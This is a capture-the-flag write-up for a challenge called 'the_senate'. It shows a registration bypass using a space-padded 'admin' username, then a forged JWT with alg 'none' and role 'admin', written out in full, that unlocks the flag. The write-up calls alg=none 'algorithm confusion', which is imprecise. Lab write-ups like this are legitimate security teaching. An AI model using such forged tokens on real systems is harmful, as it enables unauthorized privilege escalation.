# the_senate - JWT Algorithm Confusion Attack

## Challenge Description
I don't know how to make these images related to the challenge. Good luck.

Challenge URL: `http://the-senate-f61edd3319c3.instancer.grayhats.club`

<img width="600" height="1400" alt="1" src="https://github.com/user-attachments/assets/4d521d7f-9678-4377-8042-9675fb904fc1" />


## Solution

### Initial Analysis
Upon accessing the challenge instance, I was presented with a login page featuring humorous imagery of "senate blob" characters with the text "WE OWN THE SENATE" and "THE SENATE DOES OUR BIDDING". The page had a simple login form with username and password fields, along with a "Register" option for new accounts.
<img width="600" height="1373" alt="2" src="https://github.com/user-attachments/assets/31de24ea-373f-4bf7-8233-f5be0c48daa1" />


I first attempted to log in as `admin` with a common password, but those credentials were already taken. This suggested I needed to find another way to gain access.

### User Registration Bypass
To bypass the existing admin account, I registered a new account with a whitespace character appended to the username:

```
Username: admin 
Password: ******
```

(Note: The username is "admin" followed by a space character)
<img width="600" height="1332" alt="3" src="https://github.com/user-attachments/assets/a46ed297-098f-406b-9e74-32f337b9ff3b" />

This allowed me to successfully register and log in, as the application treated `"admin "` as a different username from `"admin"`.
<img width="600" height="1399" alt="4" src="https://github.com/user-attachments/assets/d52424b8-0950-4e1c-aaf8-c3dc952e1437" />


### Dashboard Analysis
After logging in with the whitespace-padded admin account, I was presented with a dashboard showing:
- A message box stating "Nothing for you!"
- Cookie imagery prominently displayed in the background (a strong hint!)
- A "Logout" button
<img width="600" height="1382" alt="5" src="https://github.com/user-attachments/assets/e7af7a16-4d83-414d-8b27-611caef72cb4" />

The cookie imagery suggested that the vulnerability was related to session cookies, specifically JWT tokens.

### Cookie Inspection and JWT Discovery
I opened the browser's Developer Tools (F12) and navigated to Application → Storage → Cookies to examine the session cookie. I found an `auth_token` cookie containing a JWT (JSON Web Token):

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluICIsInJvbGUiOiJ1c2VyIn0...
```

<img width="600" height="1370" alt="6" src="https://github.com/user-attachments/assets/2bef5ddd-775e-444c-b480-e65f1f5bf22f" />


The JWT token structure consists of three parts separated by periods: `header.payload.signature`

### JWT Decoding
I used [jwt.io](https://jwt.io) to decode the JWT and analyze its contents:
<img width="600" height="1392" alt="7" src="https://github.com/user-attachments/assets/b00c22a2-5bbc-462b-862e-9d3615734c9d" />


**Header:**
```json
{
  "typ": "JWT",
  "alg": "RS256"
}
```

**Payload:**
```json
{
  "username": "admin ",
  "role": "user"
}
```

**Key Observations:**
- Algorithm: RS256 (RSA Signature with SHA-256)
- Username contains a trailing space
- Role is set to "user" instead of "admin"
- The signature verification appeared to be vulnerable

### Identifying the Vulnerability
The vulnerability here is a classic **JWT Algorithm Confusion Attack**. Many JWT implementations accept the `"alg": "none"` algorithm, which bypasses signature verification entirely. This allows an attacker to:

1. Change the algorithm from `RS256` to `none`
2. Modify the payload to escalate privileges
3. Remove the signature (keeping only the trailing period)

### Crafting the Malicious JWT
Using [CyberChef](https://gchq.github.io/CyberChef/), I crafted a new JWT token with the following modifications:

**Step 1: Modify the Header**
Changed the algorithm to "none":
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Using CyberChef's "To Base64" operation:
<img width="600" height="1409" alt="8" src="https://github.com/user-attachments/assets/6c5d960e-11be-4b54-b1be-9919d0145e36" />

Base64 encoded result: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

**Step 2: Modify the Payload**
Changed the role to "admin" and removed the whitespace from username:
```json
{
  "username": "admin",
  "role": "admin"
}
```
<img width="600" height="1393" alt="9" src="https://github.com/user-attachments/assets/9ece0647-cbe3-455e-ab96-293ebc3b9ece" />


Base64 encoded result: `eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0`

**Step 3: Construct the Final JWT**
Combined the encoded header and payload with periods, and added a trailing period (no signature):
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

Note the trailing period with no signature - this is crucial for the `alg=none` attack!

### Exploitation
I replaced the `auth_token` cookie value with the crafted JWT:

1. Opened Developer Tools → Application → Cookies
2. Found the `auth_token` cookie
3. Double-clicked the value and replaced it with: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.`
4. Refreshed the page

### Capturing the Flag
After refreshing the page with the modified JWT token, the flag was immediately displayed on the dashboard:

```
PCF{Th3_G0a7s_0f_Th3_S3n@t3}
```
<img width="600" height="1395" alt="10" src="https://github.com/user-attachments/assets/2bd06577-98e5-4916-8686-c1177fa4561d" />


